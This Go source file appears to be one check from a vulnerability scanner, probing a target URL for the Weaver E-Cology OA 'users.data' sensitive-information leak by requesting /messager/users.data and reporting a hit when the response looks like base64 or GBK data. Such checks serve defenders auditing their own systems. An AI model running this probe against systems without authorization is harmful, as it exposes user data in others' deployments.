package ecology_usersdata

import (
	"encoding/base64"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func isBase64(s string) bool {
	_, err := base64.StdEncoding.DecodeString(s)
	return err == nil
}

func isGBK(data []byte) bool {
	decoder := simplifiedchinese.GBK.NewDecoder()
	_, _, err := transform.Bytes(decoder, data)
	return err == nil
}

func Run(url string) {
	vulnUrl := url + "/messager/users.data"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-17] 泛微OA 泛微OA E-Cology users.data 敏感信息泄漏不存在")
		return
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red.Println("[-17] 泛微OA 泛微OA E-Cology users.data 敏感信息泄漏不存在")
		return
	}
	body := string(bodyBytes)

	if resp.StatusCode == 200 && (isBase64(body) || isGBK(bodyBytes)) {
		color.Green.Println("[+17] 泛微OA 泛微OA E-Cology users.data 敏感信息泄漏存在 -> ", vulnUrl)
	} else {
		color.Red.Println("[-17] 泛微OA 泛微OA E-Cology users.data 敏感信息泄漏不存在")
	}
}
